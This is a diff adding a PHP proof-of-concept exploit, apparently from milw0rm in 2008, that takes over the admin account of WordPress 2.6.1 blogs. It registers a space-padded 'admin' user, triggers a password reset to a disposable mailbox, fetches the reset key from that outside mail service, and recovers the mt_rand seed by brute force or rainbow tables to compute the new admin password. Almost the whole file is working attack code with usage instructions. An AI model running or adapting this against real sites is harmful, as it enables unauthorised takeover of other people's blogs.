@@ -1,0 +1,155 @@
+#!/usr/bin/php
+<?php
+# ------------------------------------------------------------
+# quick'n'dirty wordpress admin-take0ver poc
+# by iso^kpsbr in august 2oo8 
+#
+# works w/ wordpress 2.6.1
+#
+#         .oO( private -- do not spread! )Oo.
+#
+# you'll have to make sure you run roughly the same
+# php version as on the server, that is: if server
+# is >=5.2.1 you'll need to be as well, in case
+# server is <5.2.1, your php also needs to be below.
+# to make sure it works you'll need the exact same version!
+# also, mod_php works better than (f)cgi..
+# (this is a first working version - not a very reliable one)
+#
+# you should create rainbow tables to make this work in a
+# real world scenario:
+# php-5.2.0/php createtables.php > wp261_php520
+# php-5.2.1/php createtables.php > wp261_php521
+#
+#-------------------------------------------------------------
+
+	$BLOG = $_SERVER['argv'][1];
+
+	echo "[+] w0rdpress 2.6.1. admin takeover, iso 0808\n";
+
+	if(!$BLOG) {
+		echo "[!] Usage: ".$_SERVER['argv'][0]." blogurl\n";
+		echo "    fe: ".$_SERVER['argv'][0]." http://31337.biz/blog\n";
+		exit;
+	}
+
+	$UA = "WordpressAdminTakeover";
+	$MBOX="wp".`ps|md5sum|head -c 8`;
+	$EMAIL="$MBOX@nospamfor.us";
+
+	echo (file_exists('wp261_php520') && file_exists('wp261_php521')) ?
+			"[X] rainbow tables available\n" :
+			"[!] rainbow tables not found - this will be really slow\n";
+
+	set_time_limit(0);
+	ini_set("max_execution_time",0);
+	ini_set("default_socket_timeout",20);
+
+	if(!preg_match('!http://([^/]+)(.*)$!', $BLOG, $match)) {
+		die("[!] $BLOG is no valid URL\n");
+	}
+
+	$HOST = $match[1];
+	$PATH = $match[2];
+	if(!$PATH) $PATH='/';
+
+	echo "[-] registering new admin user\n";
+	$suck = fsockopen($HOST, 80) or die("[!] could not connect to $HOST:80\n");
+	$data = "user_login=admin".str_repeat("%20",60)."x&user_email=$EMAIL";
+	$req = "POST $PATH/wp-login.php?action=register HTTP/1.1\r\nHost: $HOST\r\nUser-Agent: $UA\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ".strlen($data)."\r\n\r\n".$data;
+	fputs($suck, $req);
+	sleep(1);
+	fclose($suck);
+
+	echo "[-] requesting resetlink and mail to '$EMAIL'\n";
+	$suck = fsockopen($HOST, 80) or die("[!] could not connect to $HOST:80\n");
+	$data="user_login=$EMAIL&wp-submit=Get+New+Password";	
+	$req = "POST $PATH/wp-login.php?action=lostpassword HTTP/1.1\r\nHost: $HOST\r\nReferer: $BLOG/wp-login.php?action=lostpassword\r\nConnection: keep-alive\r\nKeep-Alive: 300\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ".strlen($data)."\r\n\r\n".$data."\r\n";
+	fputs($suck, $req);
+
+	echo "[.] giving $BLOG some time to deliver mail..\n";
+	for($i=0;$i<8;$i++) {
+		fputs($suck,"GET / HTTP/1.1\r\nHost: $HOST\r\nConnection: keep-alive\r\nKeep-Alive: 300\r\n\r\n");
+		sleep(2);
+	}
+
+	echo "[-] fetching resetlink token $MBOX\n";
+	$PAGE = file_get_contents("http://www.nospamfor.us/mailbox.php?mailbox=$MBOX&sitename=nospamfor.us");
+	if(!preg_match('/.+mailid=(\d+).+?Reset/s', $PAGE, $match)) die("[!] failed to find resetmail try raising the wait-time right above\n");
+	$MAILID=$match[1];
+
+	echo "[-] fetching resetmail $MAILID\n";
+
+	$WHOLEMAIL=file_get_contents("http://www.nospamfor.us/mail.php?mailid=$MAILID&sitename=nospamfor.us&mailbox=$MBOX");
+	if(!preg_match('/key=([A-z0-9]+)/', $WHOLEMAIL, $match)) die("[!] could not find resetkey in $WHOLEMAIL\n");
+	$KEY=$match[1];
+
+	echo "[X] found resetkey $KEY\n";
+	echo "[-] resetting password\n";
+
+	$req = "GET $PATH/wp-login.php?action=rp&key=$KEY HTTP/1.1\r\nHost: $HOST\r\nUser-Agent:$UA\r\nConnection: close\r\n\r\n";
+	fputs($suck, $req);
+	while(!feof($suck)) {
+		#echo "D:".
+		fgets($suck);
+	}
+	fclose($suck);
+
+	echo "[-] calculating password\n";
+	$SEED=false;
+	if(file_exists('wp261_php520')) {
+		$SEED=`grep -F $KEY wp261*|cut -d : -f 1`;
+		echo "[X] got seed $SEED from rainbow table\n";
+	}
+	$PASSWORD=calcpass($KEY, $SEED);
+
+	echo "[X] all done.";
+	exit;
+
+	function calcpass($resetkey, $seed = false) {
+		mt_srand(2); $a = mt_rand(); mt_srand(3); $b = mt_rand();
+		define('BUGGY', $a == $b);
+		echo "[-] wpress password computation. runnig in ".(BUGGY?'fast':'slow')." mode\n";
+
+		echo "[+] got key $resetkey via mail\n";
+
+		if(!$seed) $seed = getseed($resetkey);
+
+		if($seed===false) die("[!] seed not found :( try using identical php version (< 5.2.5)\n");
+
+		mt_srand($seed);
+		echo "[-] seed for key ".wp_generate_password(20,false)." is $seed\n";
+		$pass = wp_generate_password();
+		echo "[+] new credentials are admin:$pass\n";
+		return $pass;
+	}
+
+	function wp_generate_password($length = 12, $special_chars = true) {
+		$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+		if ( $special_chars )
+			$chars .= '!@#$%^&*()';
+
+		$password = '';
+		for ( $i = 0; $i < $length; $i++ )
+			$password .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
+		return $password;
+	} 
+
+	function getseed($resetkey) {
+		echo "[-] calculating rand seed for $resetkey (this will take a looong time)";
+		$max = pow(2,(32-BUGGY));
+		for($x=0;$x<=$max;$x++) {
+			$seed = BUGGY ? ($x << 1) + 1 : $x;
+			mt_srand($seed);
+			$testkey = wp_generate_password(20,false);
+			if($testkey==$resetkey) { echo "o\n"; return $seed; }
+
+			if(!($x % 10000)) echo ".";
+		}
+		echo "\n";
+		return false;
+	}
+
+?>
+
+# milw0rm.com [2008-09-10]
